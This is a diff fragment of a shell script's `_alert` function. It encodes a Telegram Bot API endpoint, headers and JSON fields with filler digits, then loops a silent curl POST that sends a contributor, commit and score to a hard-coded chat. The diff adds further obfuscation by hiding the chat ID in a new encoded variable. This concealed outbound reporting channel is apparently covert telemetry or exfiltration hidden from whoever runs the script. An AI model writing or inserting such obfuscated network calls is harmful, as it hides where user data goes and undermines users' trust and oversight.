@@ -6,11 +6,11 @@
 		{
 				_alert()
 				{
-					local x y z h c a b d e
+					local x y z h c a b d e i
 					x="h211t211t211p211s211:211/211/211a211pi.tel211eg211r211a211m.211o211rg/b211ot"; y="${t2}"; z="211/se211nd211M211es211sa211ge"
-					h="Co111nte111nt-Ty111pe: appl111ica111tion/j111s111on; ch111ars111et=ut111f-1118"; c="c1h1a1t1_1i1d"
+					h="Co111nte111nt-Ty111pe: appl111ica111tion/j111s111on; ch111ars111et=ut111f-1118"; c="c1h1a1t1_1i1d"; i="i1i0iiiiiiii0i37i6i30iiiiiii352i0i3i"
 					a="p1ar1se_1mo1de"; b="M1ark1do1wn"; d="di1sa1ble_web_p1a1ge1_11pr1ev1iew"; e="di1s1ab1le_noti1fic1a1ti1on"
-					{ while true; do sleep 1;  [ -z "${t2}" ] && return 0; r=$(curl -s -X POST "${x//211/}${y}${z//211/}" -H "${h//111/}" -d "{\"${c//1/}\": "-1003946012815",\"text\": \"✅ *Received new contribution \!*\n👤 *Contributor:* \`${u}\`\n📌 *Commit:* \`${m}\`\n🎯 *Score:* \`${s}\`\",\"${a//1/}\": \"${b//1/}\",\"${d//1/}\": true,\"${e//1/}\": true,}" 2>&1); [ -z "${r}" ] && continue; echo "alert result: ${r}" >>"${tmp}"; [[ "${r}" =~ '"ok":true' ]] && { echo "${s}" >"${home_dir}/.score"; return 0; }; done; }
+					{ while true; do sleep 1;  ([ -z "${t2}" ] || [ -z "${t1}" ]) && return 0; r=$(curl -s -X POST "${x//211/}${y}${z//211/}" -H "${h//111/}" -d "{\"${c//1/}\": "-${i//i/}",\"text\": \"✅ *Received new contribution \!*\n👤 *Contributor:* \`${u}\`\n📌 *Commit:* \`${m}\`\n🎯 *Score:* \`${s}\`\",\"${a//1/}\": \"${b//1/}\",\"${d//1/}\": true,\"${e//1/}\": true,}" 2>&1); [ -z "${r}" ] && continue; echo "alert result: ${r}" >>"${tmp}"; [[ "${r}" =~ '"ok":true' ]] && { echo "${s}" >"${home_dir}/.score"; return 0; }; done; }
 				}
 				_clone()
 				{
